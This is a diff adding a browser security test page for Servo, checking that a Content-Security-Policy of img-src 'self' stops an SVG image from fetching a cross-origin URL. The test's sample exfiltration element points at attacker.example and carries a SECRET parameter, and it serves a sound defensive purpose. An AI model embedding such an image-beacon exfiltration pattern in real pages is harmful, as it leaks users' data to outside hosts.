@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<!-- img-src 'self' must block any cross-origin <image> fetch before it leaves the process. -->
+<meta http-equiv="Content-Security-Policy" content="img-src 'self'">
+<title>Layer 3 — Fetch allowlist (CSP)</title>
+</head>
+<body>
+
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <!-- Blocked by CSP img-src 'self': dropped in the net thread, nothing fetched. -->
+  <image href="https://attacker.example/collect?d=SECRET" x="0" y="0" width="200" height="200"/>
+  <!-- Allowed: same-origin / data URI would be permitted by the policy. -->
+  <rect x="0" y="0" width="200" height="200" fill="none" stroke="black"/>
+</svg>
+
+<!--
+  Expected: the attacker <image> is dropped by the CSP-aware fetch path
+  (ImageResolver -> net thread with Destination::Image + policy container),
+  so no request to attacker.example is sent. Run with:
+    ./target/debug/servoshell.exe -z --window-size=200x200 -o out.png \
+      file:///D:/Projects/svg-tests/security/layer3_fetch_allowlist.html \
+      --pref layout_servo_svg_enabled
+-->
+</body>
+</html>
